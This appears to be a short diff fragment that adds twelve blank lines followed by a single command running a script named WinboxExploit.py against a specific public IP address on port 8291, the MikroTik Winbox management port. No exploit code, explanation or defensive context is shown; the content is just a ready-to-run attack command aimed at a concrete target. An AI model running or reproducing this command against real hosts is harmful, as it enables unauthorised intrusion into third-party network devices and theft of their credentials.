@@ -1,0 +1,13 @@
+
+
+
+
+
+
+
+
+
+
+
+
+python WinboxExploit.py 43.241.28.86 8291
